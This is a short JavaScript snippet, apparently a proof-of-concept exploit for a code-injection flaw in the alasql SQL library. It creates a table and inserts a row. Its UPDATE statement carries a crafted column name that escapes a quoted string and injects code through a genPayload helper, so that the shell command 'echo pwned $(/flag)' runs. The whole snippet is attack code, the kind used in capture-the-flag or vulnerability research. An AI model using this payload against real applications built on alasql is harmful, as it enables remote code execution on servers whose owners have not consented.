alasql("CREATE TABLE example1 (a INT)");
alasql("INSERT INTO example1 VALUES (1337)");
alasql("UPDATE example1 SET [0'+${genPayload(">&2 echo UPDATE pwned $(/flag)")}+']=42");
